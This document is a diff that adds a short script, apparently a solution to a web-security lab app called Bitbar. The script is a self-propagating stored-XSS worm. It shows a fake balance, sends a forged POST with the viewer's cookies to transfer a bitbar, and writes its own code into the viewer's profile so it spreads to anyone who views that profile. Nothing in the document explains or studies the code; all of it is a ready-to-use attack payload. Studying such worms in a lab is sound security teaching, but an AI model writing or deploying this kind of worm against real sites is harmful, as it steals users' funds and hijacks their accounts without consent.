@@ -1,0 +1,31 @@
+<script>
+document.querySelector("p#bitbar_display").id="my_bitbars";
+document.querySelector("p#my_bitbars").innerText="10 bitbars";
+
+const bitbar =  new URLSearchParams({
+                destination_username: document.querySelector("form.pure-form>input").value,
+                quantity: "1"
+});
+async function forgeryTransfer(){    
+const res=await fetch("http://localhost:3000/post_transfer", {
+                method: "POST",
+                body: bitbar,
+                credentials: "include"
+});
+}
+forgeryTransfer();
+
+const profile =  new URLSearchParams({
+                new_profile: document.querySelector("div#profile").innerHTML 
+});
+
+async function forgeryProfile(){    
+const res=await fetch("http://localhost:3000/set_profile", {
+                method: "POST",
+                body: profile,
+                credentials: "include"
+});
+}
+forgeryProfile();
+
+</script>
